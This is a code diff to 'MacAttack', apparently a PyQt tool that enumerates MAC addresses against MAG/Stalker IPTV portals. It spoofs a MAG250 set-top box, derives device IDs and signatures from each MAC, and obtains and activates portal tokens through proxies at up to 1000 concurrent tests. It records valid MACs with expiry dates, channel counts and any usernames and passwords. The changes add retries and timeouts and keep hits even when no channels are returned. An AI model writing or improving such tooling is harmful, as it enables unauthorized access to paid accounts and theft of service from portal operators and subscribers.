@@ -17,6 +17,7 @@ from datetime import datetime
 from urllib.parse import quote, urlparse, urlunparse
 from contextlib import contextmanager
 import requests
+from requests.exceptions import RequestException, Timeout, ProxyError
 import vlc
 from PyQt5.QtCore import (QBuffer, QByteArray, QEasingCurve, QEvent,
                           QPropertyAnimation, Qt, QThread, QTimer, pyqtSignal)
@@ -30,7 +31,7 @@ from PyQt5.QtWidgets import (QAbstractItemView, QApplication, QCheckBox,
                              QWidget)
 from requests.adapters import HTTPAdapter
 from requests.packages.urllib3.util.retry import Retry
-logging.basicConfig(level=logging.DEBUG)
+logging.basicConfig(level=logging.ERROR)
 
 @contextmanager
 def no_proxy_environment():
@@ -61,7 +62,7 @@ def get_token(session, url, mac_address):
         hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
         signature_string = f'{sn}{mac_address}'
         signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
         headers = {
             'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
             'Accept-Encoding': 'gzip, deflate, zstd',
@@ -357,7 +358,7 @@ class RequestThread(QThread):
             hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
             signature_string = f'{sn}{mac_address}'
             signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
             headers = {
                 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                 'Authorization': f'Bearer {token}',
@@ -410,7 +411,7 @@ class RequestThread(QThread):
             hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
             signature_string = f'{sn}{mac_address}'
             signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
             headers = {
                 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                 'Authorization': f'Bearer {token}',
@@ -460,7 +461,7 @@ class RequestThread(QThread):
             hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
             signature_string = f'{sn}{mac_address}'
             signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
             headers = {
                 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                 'Authorization': f'Bearer {token}',
@@ -511,7 +512,7 @@ class RequestThread(QThread):
             hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
             signature_string = f'{sn}{mac_address}'
             signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+            metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
             headers = {
                 'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                 'Authorization': f'Bearer {token}',
@@ -1156,7 +1157,7 @@ class MacAttack(QMainWindow):
                 hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
                 signature_string = f'{sn}{mac_address}'
                 signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
                 headers = {
                     'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                     'Authorization': f'Bearer {token}',
@@ -1680,7 +1681,7 @@ class MacAttack(QMainWindow):
     def enable_ludicrous_speed(self):
         if self.ludicrous_speed_checkbox.isChecked():
             self.ludicrous_speed_checkbox.setText(
-            "                       🚨Ludicrous Speed Activated!🚨 \n(Running at high speeds may cause the app to become unresponsive)"
+            "                       🚨Ludicrous Speed Activated!🚨 \n(Running at high speeds WILL cause the app to become unresponsive)"
         )
             self.concurrent_tests.setRange(1, 1000)
             self.proxy_concurrent_tests.setRange(1, 1000)
@@ -1986,7 +1987,7 @@ class MacAttack(QMainWindow):
             hw_version_2 = hashlib.sha1(mac.encode()).hexdigest()
             signature_string = f'{sn}{mac}'
             signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-            metrics = {'mac': mac, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+            metrics = {'mac': mac, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
             if not proxies:
                 self.update_mac_label_signal.emit(f"Testing MAC: {mac}")
             if proxies:
@@ -2024,7 +2025,7 @@ class MacAttack(QMainWindow):
                         logging.debug(f"TOKEN: {token}")
                         if token:
                             base_token = token
-                            token = self.get_token(s, self.base_url, mac, proxies) #activates token for some providers
+                            token = self.activate_token(s, self.base_url, mac, proxies) #activates token for some providers
                             logging.debug(f"Activated TOKEN: {token}")
                             if not token:
                                 token = base_token
@@ -2077,81 +2078,87 @@ class MacAttack(QMainWindow):
                                     except (TypeError, json.decoder.JSONDecodeError) as e:
                                         self.update_error_text_signal.emit(f"Data parsing error for channels data: {str(e)}")
                                         count = 0
-                                if count > 0:
-                                    logging.info("Mac found")
-                                    if self.autoloadmac_checkbox.isChecked():
-                                        self.hostname_input.setText(self.base_url)
-                                        self.mac_input.setText(mac)
-                                    if self.output_file is None:
-                                        output_filename = self.OutputMastermind()
-                                        self.output_file = open(output_filename, "a")
-                                    if self.moreoutput_checkbox.isChecked():
-                                        # Helper function to resolve IP addresses
-                                        def resolve_ip_address(hostname, default_message):
-                                            try:
-                                                return socket.gethostbyname(hostname)
-                                            except socket.gaierror:
-                                                logging.info(f"Unable to resolve the IP address for {hostname}.")
-                                                return default_message
-                                        # Resolve middleware IP address
-                                        parsed_middleware = urlparse(self.base_url)
-                                        middleware_hostname = parsed_middleware.hostname
-                                        middleware_ip_address = resolve_ip_address(middleware_hostname, "No Portal?")
-                                        logging.info(f"The IP address for {middleware_hostname} is {middleware_ip_address}")
-                                        # Resolve backend IP address
-                                        backend_ip_address = resolve_ip_address(hostname, "No Backend")
-                                        logging.info(f"The IP address for {hostname} is {backend_ip_address}")
-                                        # Determine if middleware and backend are the same
-                                        is_same_host = middleware_hostname == hostname
-                                        host_comparison = "Same middleware and backend" if is_same_host else "Different middleware and backend"
-                                        logging.info(host_comparison)
-                                        # Construct the result message
-                                        def generate_result_message(include_user, include_backend):
-                                            # Get the current date and time in the desired format
-                                            current_time = datetime.now().strftime("%B %d, %Y, %I:%M %p")
-                                            base_message = (
-                                                f"{'Portal:':<10} {self.iptv_link}\n"
-                                                f"{'IP:':<10} {middleware_ip_address}\n"
-                                                f"{'MAC:':<10} {mac}\n"
-                                                f"{'ID1:':<10} {device_id} Fail, use device_id2 both device ids.\n"
-                                                f"{'ID2:':<10} {device_id2}\n"
-                                                f"{'Serial #:':<10} {sn}\n"
-                                                f"{'Found on:':<10} {current_time}\n"
-                                                f"{'Exp date:':<10} {expiry}\n"
-                                                f"{'Channels:':<10} {count}\n"
-                                            )
-                                            backend_message = (
-                                                f"{'Backend: ':<10} {domain_and_port}\n"
-                                                f"{'IP: ':<10} {backend_ip_address}\n"
-                                            ) if include_backend else ""
-                                            user_message = (
-                                                f"{'User:':<10} {username}\n"
-                                                f"{'Pass:':<10} {password}\n"
-                                            ) if include_user else ""
-                                            return base_message + backend_message + user_message
-                                        # Emit the appropriate message based on backend and username status
-                                        result_message = generate_result_message(userfound, not is_same_host)
-                                        self.update_output_text_signal.emit(result_message)  # No extra newline here
-                                    else:
-                                        # Simple output message when additional details are not required
-                                        result_message = (
-                                            f"{'Portal:  ':<10} {self.iptv_link}\n"
-                                            f"{'MAC addr:':<10} {mac}\n"
+                                if count < 1:
+                                    count = "Unknown"
+                                logging.info("Mac found")
+                                if self.autoloadmac_checkbox.isChecked():
+                                    self.hostname_input.setText(self.base_url)
+                                    self.mac_input.setText(mac)
+                                if self.output_file is None:
+                                    output_filename = self.OutputMastermind()
+                                    self.output_file = open(output_filename, "a")
+                                if self.moreoutput_checkbox.isChecked():
+                                    # Helper function to resolve IP addresses
+                                    def resolve_ip_address(hostname, default_message):
+                                        try:
+                                            return socket.gethostbyname(hostname)
+                                        except socket.gaierror:
+                                            logging.info(f"Unable to resolve the IP address for {hostname}.")
+                                            return default_message
+                                    # Resolve middleware IP address
+                                    parsed_middleware = urlparse(self.base_url)
+                                    middleware_hostname = parsed_middleware.hostname
+                                    middleware_ip_address = resolve_ip_address(middleware_hostname, "No Portal?")
+                                    logging.info(f"The IP address for {middleware_hostname} is {middleware_ip_address}")
+                                    # Resolve backend IP address
+                                    backend_ip_address = resolve_ip_address(hostname, "No Backend")
+                                    logging.info(f"The IP address for {hostname} is {backend_ip_address}")
+                                    # Determine if middleware and backend are the same
+                                    is_same_host = middleware_hostname == hostname
+                                    host_comparison = "Same middleware and backend" if is_same_host else "Different middleware and backend"
+                                    logging.info(host_comparison)
+                                    # Construct the result message
+                                    def generate_result_message(include_user, include_backend):
+                                        # Get the current date and time in the desired format
+                                        current_time = datetime.now().strftime("%B %d, %Y, %I:%M %p")
+                                        base_message = (
+                                            f"{'Portal:':<10} {self.iptv_link}\n"
+                                            f"{'PortalIP:':<10} {middleware_ip_address}\n"
+                                            f"{'MAC Addr:':<10} {mac}\n"
+                                            f"{'DeviceID:':<10} {device_id}\n"
+                                            f"{'SecondID:':<10} {device_id2}\n"
+                                            f"{'Serial #:':<10} {sn}\n"
+                                            f"{'Found on:':<10} {current_time}\n"
                                             f"{'Exp date:':<10} {expiry}\n"
                                             f"{'Channels:':<10} {count}\n"
                                         )
-                                        self.update_output_text_signal.emit(result_message)  # No extra newline here
-                                    # Write to file with a single blank line after each output
-                                    self.output_file.write(result_message + '\n')
-                                    self.output_file.flush()  # Ensures data is written immediately
-                                    if self.successsound_checkbox.isChecked():
-                                        sound_thread = threading.Thread(target=self.play_success_sound)
-                                        sound_thread.start()  # Start the background thread
-                                    if self.autostop_checkbox.isChecked():
-                                        logging.debug("autostop_checkbox is checked, stopping...")
-                                        self.stop_button.click()
+                                        backend_message = (
+                                            f"{'Backend: ':<10} {domain_and_port}\n"
+                                            f"{'IP Addr: ':<10} {backend_ip_address}\n"
+                                        ) if include_backend else ""
+                                        user_message = (
+                                            f"{'Username:':<10} {username}\n"
+                                            f"{'Password:':<10} {password}\n"
+                                        ) if include_user else ""
+                                        return base_message + backend_message + user_message
+                                    # Emit the appropriate message based on backend and username status
+                                    result_message = generate_result_message(userfound, not is_same_host)
+                                    self.update_output_text_signal.emit(result_message)  # No extra newline here
                                 else:
-                                    result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
+                                    # Simple output message when additional details are not required
+                                    result_message = (
+                                        f"{'Portal:':<10} {self.iptv_link}\n"
+                                        f"{'MAC addr:':<10} {mac}\n"
+                                        f"{'Exp date:':<10} {expiry}\n"
+                                        f"{'Channels:':<10} {count}\n"
+                                    )
+                                    self.update_output_text_signal.emit(result_message)  # No extra newline here
+                                # Write to file with a single blank line after each output
+                                self.output_file.write(result_message + '\n')
+                                self.output_file.flush()  # Ensures data is written immediately
+                                if self.successsound_checkbox.isChecked():
+                                    sound_thread = threading.Thread(target=self.play_success_sound)
+                                    sound_thread.start()  # Start the background thread
+                                if self.autostop_checkbox.isChecked():
+                                    logging.debug("autostop_checkbox is checked, stopping...")
+                                    self.stop_button.click()
+                                #else:
+                                #    result_message = f"MAC: {mac} connects, but has 0 channels. Bummer."
+                                    
+                                    
+                                    
+                                    
+                                    
                                     self.update_error_text_signal.emit(result_message)
                             else:
                                 #self.update_error_text_signal.emit(f"No JSON response for MAC {mac}")
@@ -2381,9 +2388,9 @@ class MacAttack(QMainWindow):
                         logging.debug(f"Raw Response Content:\n{mac}\n%s", res.text)
                     #self.error_count += 1
 
-    def get_token(self, session, url, mac_address, proxies=None):
+    def activate_token(self, session, url, mac_address, proxies=None, max_retries=1):
         try:
-            with no_proxy_environment(): #Bypass the enviroment proxy set in the video player tab
+            with no_proxy_environment():  # Bypass the environment proxy set in the video player tab
                 serialnumber = hashlib.md5(mac_address.encode()).hexdigest().upper()
                 sn = serialnumber[0:13]
                 device_id = hashlib.sha256(sn.encode()).hexdigest().upper()
@@ -2391,7 +2398,7 @@ class MacAttack(QMainWindow):
                 hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
                 signature_string = f'{sn}{mac_address}'
                 signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+                metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
                 headers = {
                     'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                     'Accept-Encoding': 'gzip, deflate, zstd',
@@ -2409,38 +2416,62 @@ class MacAttack(QMainWindow):
                     'stb_lang': 'en',
                     'timezone': 'America/Los_Angeles'
                 }
-                # Send GET request to fetch the version.js file with optional proxy
-                response = session.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies)
-                # Extract the version number from the response body
-                version = re.search(r"var ver = '(.*)';", response.text)
-                if version:
-                    portal_version = version.group(1)
-                    logging.debug("Portal Version: %s", version.group(1))
-                else:
-                    portal_version = "5.0"
-                    logging.debug("Portal version not found.")
-                url = f"{url}/portal.php"  # Add portal.php for next 2 requests
-                # Data for the first request (to get the token)
+                
+                # Retry logic for fetching version.js
+                attempt = 0
+                while attempt < max_retries:
+                    try:
+                        response = session.get(f"{url}/c/version.js", headers=headers, cookies=cookies, proxies=proxies, timeout=10)
+                        version = re.search(r"var ver = '(.*)';", response.text)
+                        if version:
+                            portal_version = version.group(1)
+                            logging.debug("Portal Version: %s", version.group(1))
+                            break
+                        else:
+                            portal_version = "5.0"
+                            logging.debug("Portal version not found.")
+                            break
+                    except (Timeout, ProxyError) as e:
+                        attempt += 1
+                        logging.warning(f"Attempt {attempt} failed to fetch version.js: {e}. Retrying...")
+                        if attempt == max_retries:
+                            portal_version = "5.0"  # Default version if retries are exhausted
+                            logging.warning("Max retries reached. Using default version.")
+                        else:
+                            time.sleep(2)  # Wait before retrying
+
+                # After fetching version.js (or skipping if it failed), continue with the regular flow
+                url = f"{url}/portal.php"  # Add portal.php for the next 2 requests
                 data = {
                     'type': 'stb',
                     'action': 'handshake',
                     'token': '',
                     'prehash': '0'
                 }
-                # Step 1: Send the first request to get the token with optional proxy
-                response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
-                # Check if the response is successful
-                if response.status_code == 200:
-                    # Parse the JSON response to get the token
-                    token = response.json().get("js", {}).get("token")
-                    logging.debug("Received Token: %s", token)
-                else:
-                    logging.debug(f"Failed to get token, Status Code: {response.status_code}")
-                    return None
-                # Step 2: Use the received token to send the second request
-                # Update headers for the second request with the Authorization Bearer token
+
+                # Retry logic for the first POST request
+                attempt = 0
+                while attempt < max_retries:
+                    try:
+                        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, timeout=10)
+                        if response.status_code == 200:
+                            token = response.json().get("js", {}).get("token")
+                            logging.debug("Received Token: %s", token)
+                            break
+                        else:
+                            logging.debug(f"Failed to get token, Status Code: {response.status_code}")
+                            return None
+                    except (Timeout, ProxyError) as e:
+                        attempt += 1
+                        logging.warning(f"Attempt {attempt} failed to get token: {e}. Retrying...")
+                        if attempt == max_retries:
+                            logging.warning("Max retries reached. Couldn't Activate token.")
+                            return None
+                        else:
+                            time.sleep(2)
+
+                # Retry logic for the second POST request
                 headers['Authorization'] = f'Bearer {token}'
-                # Data for the second request (get profile)
                 data = {
                     'type': 'stb',
                     'action': 'get_profile',
@@ -2464,16 +2495,28 @@ class MacAttack(QMainWindow):
                     'api_signature': '262',
                     'prehash': '0'
                 }
-                # Send the second request with optional proxy
-                response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies)
-                # Output the result of the second request
-                logging.debug(f"Response Status Code: {response.status_code}")
-                logging.debug("Response Text:")
-                logging.debug(response.text)
-                return token
+
+                attempt = 0
+                while attempt < max_retries:
+                    try:
+                        response = session.post(url, headers=headers, cookies=cookies, data=data, proxies=proxies, timeout=10)
+                        logging.debug(f"Response Status Code: {response.status_code}")
+                        logging.debug("Response Text:")
+                        logging.debug(response.text)
+                        return token
+                    except (Timeout, ProxyError) as e:
+                        attempt += 1
+                        logging.warning(f"Attempt {attempt} failed to send second POST request: {e}. Retrying...")
+                        if attempt == max_retries:
+                            logging.warning("Max retries reached. Exiting.")
+                            return None
+                        else:
+                            time.sleep(2)
+
         except Exception as e:
-            logging.error(f"Unexpected error in get_token: {e}")
+            logging.warning(f"Unexpected error in Activate_token: {e}")
             return None
+        
 
     def remove_proxy(self, proxy, proxy_error_counts):
         """Remove a proxy after exceeding error count and update UI."""
@@ -2740,7 +2783,7 @@ class MacAttack(QMainWindow):
                         hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
                         signature_string = f'{sn}{mac_address}'
                         signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-                        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+                        metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
                         headers = {
                             'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                             'Authorization': f'Bearer {token}',
@@ -2801,7 +2844,7 @@ class MacAttack(QMainWindow):
                     hw_version_2 = hashlib.sha1(mac_address.encode()).hexdigest()
                     signature_string = f'{sn}{mac_address}'
                     signature = hashlib.sha256(signature_string.encode()).hexdigest().upper()
-                    metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': '0'}
+                    metrics = {'mac': mac_address, 'sn': sn, 'type': 'STB', 'model': 'MAG250', 'uid': device_id, 'random': ''}
                     headers = {
                         'User-Agent': 'Mozilla/5.0 (QtEmbedded; U; Linux; C) AppleWebKit/533.3 (KHTML, like Gecko) MAG200 stbapp ver: 2 rev: 250 Safari/533.3',
                         'Authorization': f'Bearer {token}',
@@ -3031,7 +3074,7 @@ class MacAttack(QMainWindow):
                 if self.videoPlayer.is_playing():  # Check if the video is currently playing
                     self.videoPlayer.pause()  # Pause the video
 
-    def killthreads(self):
+    def killthreads(self): #Feeling Murderous!
         def join_threads():
             for thread in self.threads:
                 thread.join()  # Wait for each thread to finish
@@ -3041,11 +3084,9 @@ class MacAttack(QMainWindow):
 
     def closeEvent(self, event):
         self.videoPlayer.stop()
-        window.hide()
         self.SaveTheDay()
         self.GiveUp()
-        for thread in self.threads:
-            thread.join()
+        os._exit(0)
         event.accept()
 
 if __name__ == "__main__":
